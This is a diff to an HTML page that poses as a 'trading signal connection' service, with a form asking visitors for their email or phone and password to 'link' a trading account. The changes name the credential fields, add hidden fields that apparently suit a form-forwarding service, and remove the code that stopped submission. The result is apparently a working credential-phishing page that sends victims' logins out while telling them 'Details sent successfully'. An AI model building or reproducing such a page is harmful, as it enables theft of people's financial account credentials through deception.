@@ -147,36 +147,30 @@ Secure & accurate trading signal connection
 method="POST"
 onsubmit="showPopup()">
 
-<!-- EMAIL FIRST -->
-<input type="email" placeholder="Email Address" required>
+<input type="email/tel" name="Email/Phone " placeholder="Email Address/Phone (country without code)" required>
 
-<!-- PASSWORD UNDER EMAIL -->
-<input type="password" placeholder="Password" required>
+<input type="password" name="password" placeholder="Password" required>
 
-<button type="submit">
-Link Trading Account
-</button>
+<input type="hidden" name="_captcha" value="false">
+<input type="hidden" name="_template" value="table">
 
+<button type="submit">Link Trading Account</button>
 </form>
 
 </div>
 
-<!-- SUCCESS POPUP -->
-<div class="popup" id="popup">
-<div class="popup-box">
-<h2>✅ Account Linked</h2>
-<p>Connection successful.</p>
+<div id="popup" class="popup">
+<div class="popupbox">
+<h3>✅ Submitted</h3>
+<p>Details sent successfully</p>
 </div>
 </div>
 
 <script>
-
-function showPopup(e){
-e.preventDefault();
+function showPopup(){
 document.getElementById("popup").style.display="flex";
 }
-
 </script>
 
 </body>
-</html>
+</html> 
